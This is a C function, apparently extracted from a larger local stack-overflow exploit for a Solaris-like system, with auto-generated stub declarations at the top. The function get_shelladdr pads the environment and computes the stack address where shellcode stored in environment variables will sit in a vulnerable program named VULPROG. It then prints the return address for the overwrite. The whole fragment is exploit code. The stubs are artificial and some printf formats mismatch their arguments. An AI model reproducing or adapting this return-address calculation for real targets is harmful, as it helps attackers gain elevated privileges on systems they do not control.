
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int SI_PLATFORM ;
 char* VULPROG ;
 int memset (char*,char,char) ;
 int printf (char*,long,...) ;
 int strlen (char*) ;
 int sysinfo (int ,char*,int) ;

long
get_shelladdr(long sp_addr, char **arg, char **env)
{
        long retaddr;
        int i;
        char plat[256];
        char pad = 0, pad1;
        int env_len, arg_len, len;



        for (i = 0, arg_len = 0; arg[i]!=((void*)0) ; i++) {
                arg_len += strlen(arg[i]) + 1;
        }



        pad = 3 - arg_len % 4;
        printf("shellcode address padding = %d\n", pad);

        memset(env[0], 'A', pad);
        env[0][pad] = '\0';


        for (i = 0, env_len = 0; env[i]!=((void*)0); i++) {
                env_len += strlen(env[i]) + 1;
        }


        sysinfo(SI_PLATFORM, plat, 256);

        len = arg_len + env_len + strlen(plat) + 1 + strlen(VULPROG) + 1;
        printf("stack arguments len = %#x(%d)\n", len, len);

        pad1 = len % 4;

        if(pad1 == 3 ) pad1 = 5;
        else pad1 = 4 - pad1;

        printf("the padding zeros number = %d\n\n", pad1);


        retaddr = sp_addr - pad1
                          - strlen(VULPROG) - 1
                          - strlen(plat) - 1 ;

        for(i--;i>0;i--) retaddr -= strlen(env[i]) + 1;

        printf("Using RET address = 0x%x\n", retaddr);
        return retaddr;

}
